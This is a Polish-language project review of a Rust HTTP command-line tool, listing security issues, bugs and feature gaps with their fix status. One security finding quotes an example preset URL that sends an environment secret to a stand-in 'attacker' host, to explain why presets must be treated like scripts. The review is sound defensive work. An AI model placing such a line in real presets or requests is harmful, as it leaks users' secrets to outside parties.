# Przegląd projektu — 2026-07-17

Drugi przegląd (po dodaniu zmiennych sesyjnych i `| default:`), pod tym samym kątem:
architektura, bezpieczeństwo, SOLID/stairway, funkcjonalność z poziomu użytkownika.
Poprawki z przeglądu 2026-07-11 zweryfikowane w kodzie — wszystkie obecne.

## Ocena ogólna

Bez zmian strukturalnych: warstwy `cli → http/template/session → model` bez cykli,
DIP przez traity, parser i model czyste (zero I/O), clippy/fmt bez uwag.

## Bezpieczeństwo

### 1. Presety z `${{ env.* }}` mogą eksfiltrować sekrety — model zaufania
Preset z niezaufanego źródła może zawierać `url: "https://attacker/?x=${{ env.SECRET }}"`;
`then` wykona takie żądanie. Cecha nieodłączna funkcji (preset = skrypt), ale wymagała
jawnego ostrzeżenia.
**Status: udokumentowane.** README: sekcja `then` dostała ramkę "Treat preset files like
scripts" ze wskazaniem `--dry-run` jako inspekcji.

### 2. Pełne ciała odpowiedzi w pliku sesji
Duże odpowiedzi rosną kosztem każdego zapisu sesji. **Status: świadomie pominięte**
(pliki `0600`; ewentualny limit rozmiaru do rozważenia osobno).

## Błędy

### 3. `--retry 0` z `--until` dawało budżet 10 prób — `runner.rs`
Jawne `--retry 0` było nieodróżnialne od wartości domyślnej (`retry: u32 = 0`).
**Status: naprawione.** `retry: Option<u32>` — `--retry 0` ogranicza poll do jednej próby.

### 4. Literał z `}}` rozbijał interpolację — `template/mod.rs`
`${{ base64('}}') }}` kończyło się błędem: `interpolate` szukało pierwszego `}}` bez
świadomości cudzysłowów. **Status: naprawione** (`placeholder_end` pomija `}}` w cudzysłowach).

### 5. `header-rm` zniekształcał komunikat ostrzeżenia — `parser.rs`
Parser robił `to_lowercase()`, więc warning pokazywał inną pisownię niż wpisana.
**Status: naprawione** (usuwanie i tak jest case-insensitive w `Headers::remove`).

### 6. Nazwana sesja czytana, ale niemodyfikowana, znikała po 7 dniach — `session/mod.rs`
Reguła wieku opierała się na mtime, którego odczyt nie odświeżał. **Status: naprawione.**
`load` odświeża mtime (best-effort) — "7 days without use" z README jest teraz prawdą.

### 7. Niespójna pisownia flag — `parser.rs`
`fail` bez `--fail`; `--retry`/`--until`/`--delay` bez form gołych. **Status: naprawione.**
Każda flaga przyjmuje obie formy; token zjedzony jako wartość nadal nigdy nie jest flagą.

### 8. `method` wymuszał uppercase — `parser.rs`
Metody HTTP są case-sensitive (RFC 9110); niestandardowej metody nie dało się wysłać
w oryginalnej pisowni. **Status: naprawione** (`normalize_method` — uppercase tylko dla
metod standardowych).

## Funkcjonalność

### 9. Brak `body-rm`
Body dało się wyczyścić tylko `reset`em albo `load`em. **Status: dodane.**

### 10. Brak podążania za redirectami
curl ma `-L`; w reel łańcuch 302 trzeba było przechodzić ręcznie. **Status: dodane.**
`--follow`/`follow` — pętla hopów w `execute_following` (`cli/runner.rs`), nie w reqwest,
żeby jar widział każdy hop; 303 (i 301/302 po POST) → GET bez body; cross-host zdejmuje
`Authorization`/`Cookie`; limit 10 hopów (przekroczenie = `PermanentError`); do historii
trafia tylko finalna para; `curl` emituje `-L`.

### 11. Sztywny timeout 30 s
**Status: dodane.** `timeout <SECONDS>` jako pole `Request` (per żądanie, w sesji
i presetach); `0` wyłącza timeout (klient budowany bez timeoutu globalnego); `curl`
emituje `-m`.

### 12. Brak `cookie-rm`
Jar dało się wyczyścić tylko `reset`em. **Status: dodane** (`cookie-rm <NAME>` usuwa
wszystkie ciasteczka o danej nazwie).

### 13. Powtórzone nagłówki niemożliwe (mapa z deduplikacją)
**Status: udokumentowane w README jako ograniczenie** (rzadka potrzeba; zmiana modelu
`Headers` nieopłacalna).

---

# Przegląd projektu — 2026-07-11

Przegląd całego kodu pod kątem architektury, bezpieczeństwa, SOLID i wzorca stairway.

## Ocena ogólna

Architektura nie wymaga przebudowy:

- **Stairway / DIP** — `run_commands` przyjmuje `&dyn HttpClient`, `&dyn SessionStore`,
  `&dyn PresetStore`; konkretne implementacje składa dopiero `main.rs`. Konsumenci widzą
  wyłącznie traity. Trait i implementacja mieszkają w tym samym module (zamiast w osobnych,
  jak w "czystym" stairway) — dla pojedynczej binarki to właściwy pragmatyzm.
- **Warstwy** — `cli → http/template/session → model`, bez cykli; `model` i parser czyste
  (zero I/O).
- **SRP/ISP** — rozdzielenie `SessionStore` od `PresetStore` (różna semantyka ścieżek);
  `Headers` jako newtype kapsułkujący case-insensitivity.
- **Bezpieczeństwo sesji** — ochrona przed PID-reuse (`owner_start_time`), atomowy zapis
  przez rename, `0600`/`0700` na Uniksie, stamp poza `State`.
- **Testowalność** — mocki wstrzykiwane przez traity, testy per-moduł.

## Ważne

### 1. `insecure` jako *wartość* argumentu wyłączało weryfikację TLS — `cli/parser.rs`
Pre-scan flag robił `args.iter().any(...)` bez wiedzy o pozycjach, a pętla parsera konsumuje
wartości przez `value_for`. Efekt: `reel header X-Mode insecure send` albo `reel body fail send`
ustawiały globalną flagę, mimo że token był wartością nagłówka/body. W przypadku `insecure`
po cichu wyłączało to weryfikację certyfikatu. Ten sam problem miały `-h`/`--help`/`-V`/`--version`
skanowane w `main.rs` (`reel body -h` drukowało usage zamiast ustawić body).

**Status: naprawione.** Flagi ustawiane są w ramionach pętli parsera (token zjedzony jako
wartość nigdy nie jest flagą); `help`/`version` przeniesione do `GlobalFlags`. Drobna zmiana
zachowania: `reel bogus --help` zgłasza teraz błąd nieznanej komendy zamiast pokazywać usage.

### 2. Presety zapisywane z domyślnymi uprawnieniami i nieatomowo — `session/mod.rs`
Sesje dostają `0600` (mogą zawierać credentials), ale `FilePresetStore::save` używał gołego
`fs::write` — preset z nagłówkiem `Authorization` był czytelny dla innych użytkowników i mógł
zostać uszkodzony przy przerwanym zapisie.

**Status: naprawione.** Preset zapisywany jest jak sesja: temp `0600` + rename; przy nadpisywaniu
istniejącego pliku jego dotychczasowe uprawnienia są zachowywane.

### 3. reqwest domyślnie podążał za 10 przekierowaniami — `http.rs`
Konsekwencje: (a) `Set-Cookie` z odpowiedzi pośrednich (klasyczny login 302) ginęło — jar
widział tylko finalną odpowiedź; (b) curl domyślnie *nie* podąża za redirectami, więc model
mentalny użytkownika i wyjście `reel curl` rozjeżdżały się z faktycznym zachowaniem;
(c) przy downgrade https→http na tym samym hoście nagłówki `Cookie`/`Authorization` jechały
dalej, obchodząc flagę `secure` z jara.

**Status: naprawione.** `redirect(Policy::none())` — odpowiedzi 3xx trafiają do użytkownika
jak każde inne (parytet z curl; jar widzi każdy hop, gdy użytkownik podąża ręcznie).

### 4. Panika na zerwanym pipe — `main.rs` / `cli/display.rs`
Projekt dba o broken-pipe safety (save przed stdout), ale `println!` panikuje na EPIPE:
`reel send | head -1` przy dużym body kończyło się `panic: failed printing to stdout`.

**Status: naprawione.** `main` przywraca na Uniksie domyślną obsługę `SIGPIPE` (`SIG_DFL`) —
proces kończy się cicho, jak standardowe narzędzia CLI.

### 5. Ciała binarne przekłamywane bez ostrzeżenia — `http.rs`
`resp.text()` dekoduje z podmianą nieprawidłowych bajtów, a `ResponseRecord.body` to `String` —
deklaracja "raw bytes written untouched" jest prawdziwa tylko dla poprawnego UTF-8. Pełne
wsparcie binarki wymagałoby `Vec<u8>` w modelu.

**Status: ostrzeżenie (bez konwersji modelu, zgodnie z decyzją).** Body z zadeklarowanym
charsetem innym niż UTF-8 jest transkodowane jak dotąd (reqwest/encoding_rs); w pozostałych
przypadkach bajty są brane wprost — gdy nie są poprawnym UTF-8, na stderr idzie ostrzeżenie,
że wyjście nie będzie byte-exact.

## Drobiazgi

### 6. Retry na błędach nie-przejściowych — `runner.rs` / `http.rs`
Każdy `Err` z `execute` liczył się jako "network error", więc `--retry 3` z literówką w URL
grzało 4 próby ze sleepami. Retry obejmował też 501/505 (odpowiedzi trwałe z definicji).
**Status: naprawione.** Błędy klienckie (zły URL/metoda/nagłówek) niosą marker `PermanentError`
i nie są ponawiane; z 5xx ponawiane są wszystkie poza 501/505/506/510.

### 7. `format_curl` nie quotował metody — `cli/display.rs`
`reel method 'GET;X' curl` generowało polecenie z niezacytowanym średnikiem.
**Status: naprawione.** Metoda spoza `[A-Za-z0-9_-]` jest quotowana; typowe metody bez zmian.

### 8. `load` kasował cookie jar — `cli/runner.rs`
`*state = presets.load(...)` zerowało `cookies`, choć jar ma żyć "do `reset`".
**Status: naprawione.** `load` zachowuje jar sesji (chyba że ładowany plik sam zawiera cookies).

### 9. Mutacje ginęły przy błędzie w środku łańcucha — `cli/runner.rs`
`reel url X send` przy błędzie sieci gubiło `url X` (końcowy `session.save` nie następował).
**Status: naprawione.** Przy błędzie łańcucha zmodyfikowany stan jest zapisywany best-effort
(błąd zapisu nie maskuje pierwotnego błędu).

### 10. `--until` widziało kandydującą odpowiedź, ale nie kandydujące żądanie — `runner.rs`
Podczas oceny warunku `responses` miało N+1 elementów, a `requests` N — `request.url`
wskazywało poprzednie żądanie.
**Status: naprawione.** Do kontekstu doklejane są oba rekordy — indeksy pozostają wyrównane.

### 11. `ReqwestClient::new` panikował zamiast zwrócić błąd — `http.rs`
**Status: naprawione.** `new` zwraca `Result`; `main` kończy z komunikatem i kodem 1.
(Leniwa konstrukcja klienta — nieopłacalna, pominięta.)

### 12. Brak public-suffix list w cookies — `model/cookies.rs`
Odpowiedź z `foo.co.uk` może ustawić `Domain=co.uk`. Dla per-sesyjnego jara narzędzia CLI
ryzyko znikome. **Status: udokumentowane jako świadome uproszczenie (komentarz).**

### 13. Detekcja funkcji po `(` w `eval_expr` — `template/mod.rs`
Klucz JSON z nawiasem (`body.items(0)`) był brany za wywołanie funkcji.
**Status: naprawione.** Jako funkcja traktowana jest tylko nazwa w kształcie identyfikatora.

### 14. Gęstość `execute_and_record` — `cli/runner.rs`
Pętla prób, `--until`, cookies, zapis, wydruk i `fail` w jednej funkcji (~100 linii). Jeszcze
w normie. **Status: świadomie pominięte** — czysty refaktor bez zmiany zachowania; do rozważenia
przy następnej funkcjonalności w tym obszarze.
